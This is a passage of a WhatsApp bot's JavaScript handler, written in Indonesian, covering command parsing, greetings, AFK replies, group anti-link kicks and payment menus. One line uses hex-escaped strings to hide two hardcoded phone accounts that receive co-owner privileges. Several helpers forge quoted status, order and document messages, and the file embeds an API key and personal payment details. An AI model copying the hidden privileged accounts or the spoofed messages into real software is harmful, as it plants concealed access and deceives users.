
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const crypto = require('crypto')  
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const ms = require('parse-ms')
const toMs = require('ms')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const _Elite = JSON.parse(fs.readFileSync('./alpha/Elite.json')) 

zeksApikey = 'Apivinz' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.xyz' // regis disini klo mau dapat apikeynya

shop = setting.ownername
thumbnail = setting.thumb
fthumb = setting.fakethumb
hit_today = []
blocked = []

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix

banChats = true
offline = false

var nomor_ovo = `0895615756998\nA.N WILDAN KAMIL ARIFIN` 
var nomor_dana = `0895615756998\nA.N WILDAN KAMIL ARIFIN` 
var nomor_gopay = `0895615756998\nA.N WILDAN KAMIL ARIFIN` 
var qr_code_ovo = 'https://h.top4top.io/p_2053vk0uw1.jpg' 
var qr_code_dana = 'https://j.top4top.io/p_20532posd1.jpg' 
var qr_code_gopay = 'https://b.top4top.io/p_2087u9vcl1.jpg' 

img = setting.img
baper = setting.ownername
creator = setting.ownername
apiku = 'https://youtu.be/2rWbjrDIAyA'
targetpc = setting.ownerNumber
owner = setting.ownerNumber
fake = setting.fake
numbernye = '0'
waktu = '-'
alasan = '-'
botname = setting.botname
ownername = setting.ownername
cr = setting.cr
petik = '```'
enter = '\n'
msgId="B826873620DD5947E683E3ABE663F263"
//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
        const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
            const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®@™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®@™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ''
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
                chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)			
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const Ownerr = [`${targetpc}@s.whatsapp.net`]
		const isOwner = Ownerr.includes(sender)
		var _0xa1c8=["\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x39\x31\x39\x30\x34\x38\x34\x31\x36\x34\x30\x35\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];let alphaNumber=[_0xa1c8[0],_0xa1c8[1]];const isCoOwner=alphaNumber[_0xa1c8[2]](sender)
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const ratee = ["106","106","106","106","106","106","106"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + jam + ":" + menit + ":" + detik ;   
            var ase = new Date();
            var waktoo = ase.getHours();
            switch(waktoo){
                case 0: waktoo = "Selamat Malam 🌚"; break;
                case 1: waktoo = "Selamat Malam 🌚"; break;
                case 2: waktoo = "Selamat Malam 🌚"; break;
                case 3: waktoo = "Selamat Malam 🌚"; break;
                case 4: waktoo = "Selamat Pagi 🌞"; break;
                case 5: waktoo = "Selamat Pagi 🌞"; break;
                case 6: waktoo = "Selamat Pagi 🌞"; break;
                case 7: waktoo = "Selamat Pagi 🌞"; break;
                case 8: waktoo = "Selamat Pagi 🌞"; break;
                case 9: waktoo = "Selamat Pagi 🌞"; break;
                case 10: waktoo = "Selamat Pagi 🌞"; break;
                case 11: waktoo = "Waktu Dzuhur , jangan lupa shalat"; break;
                case 12: waktoo = "Selamat Siang ☀️"; break;
                case 13: waktoo = "Selamat Siang ☀️"; break;
                case 14: waktoo = "Waktu Ashar , jangan lupa shalat"; break;
                case 15: waktoo = "Selamat Sore 🌌"; break;
                case 16: waktoo = "Selamat Sore 🌌"; break;
                case 17: waktoo = "Selamat Sore 🌌"; break;
                case 18: waktoo = "Waktu Magrib, jangan lupa shalat"; break;
                case 19: waktoo = "Waktu Isya, jangan lupa shalat"; break;
                case 20: waktoo = "Selamat Malam 🌃"; break;
                case 21: waktoo = "Selamat Malam 🌃"; break;
                case 22: waktoo = "Selamat Malam 🌃"; break;
                case 23: waktoo = "Selamat Malam 🌃"; break;
            }
            var hahh = "" + waktoo;      
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
            }
            var ucapannya = "" + waktoonyabro;         
		mess = {
			wait: 'BENTAR',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
			}
		} 
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
             alpha.sendMessage(from, teks, text,{ thumbnail: fs.readFileSync(`image/${thumbnail}`),quoted: mek})
}  
        const sendText = async (txt) => {
            return alpha.sendText(from, txt)
                .catch(e => {
                    console.log(e)
                })
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${tee}.jpg`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": `${shop}`, 
					"description": "SELF BOT", 
					"currencyCode": "USD",
					"priceAmount1000": "1919199191",
					"retailerId": `${shop}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `62887435047326@s.whatsapp.net`
		}
	}
}
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `${shop}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        
        const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           const fakedoc = (teks) => {  
 alpha.sendMessage(from, teks, text, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Alphabot.zip`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})}
		const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}       
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}
    const createSerial = (size) => {
        	return crypto.randomBytes(size).toString('hex').slice(0, size)
            }            
            const addEliteUser = (userid, sender, time, serials) => {
	        const obj = { id: userid, name: sender, time: time, serial: serials }
	        _Elite.push(obj)
          	fs.writeFileSync('./alpha/Elite.json', JSON.stringify(_Elite))
            }	
            const checkEliteUser = (sender) => {
	        let status = false
	        Object.keys(_Elite).forEach((i) => {
		    if (_Elite[i].id === sender) {
			status = true
		    }
	        })
	        return status
            }
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      alpha.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };              
   const isElite = checkEliteUser(sender)     
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
if (isGroup && !mek.key.fromMe && !isGroupAdmins && !isOwner && !isCoOwner && isBotGroupAdmins){
            if (budy.includes("https://chat.whatsapp.com/")) {
                reply(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		sub_yt_zeeone_ofc = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
        subscribezeeoneofc = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
switch (command) {
	case 'igo':
	reply('https://instagram.com/itsnion_store\n\nJangan lupa follow kak')
	break
case 'bayar':
	let ksksjiwn = `*[ PAYMENT ]*

*OVO*
*_085655856100 A/N ITSNION STORE_*

*DANA*
*_085655856100 A/N LAS_VIPER_*

*GOPAY*
*085655856100 A/N ITSNION STORE*`
await sendButMessage(from, ksksjiwn, `${creator}`, [{buttonId: 'igo',buttonText: {displayText: `Instagram Owner`,},type: 1,}], {quoted: mek})
	break
	case 'format':
	let kdkd = `*[ FORMAT ORDER ]*

*➺ ɴɪᴄᴋɴᴀᴍᴇ :*
*➺ ɪᴅ :*
*➺ ᴏʀᴅᴇʀ :*
*────────────────*`
await sendButMessage(from, kdkd, `${creator}`, [{buttonId: 'igo',buttonText: {displayText: `Instagram Owner`,},type: 1,}], {quoted: mek})
	break
case 'formatt':
let ksoak = `*[ FORMAT ORDER ]*

*➺ ɴɪᴄᴋɴᴀᴍᴇ :*
*➺ ɪᴅ :*
*➺ ᴏʀᴅᴇʀ :*
*────────────────*`
await sendButMessage(from, ksoak, `${creator}`, [{buttonId: 'igo',buttonText: {displayText: `Instagram Owner`,},type: 1,}], {quoted: mek})
	break
	case 'menu': case 'help':
	let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
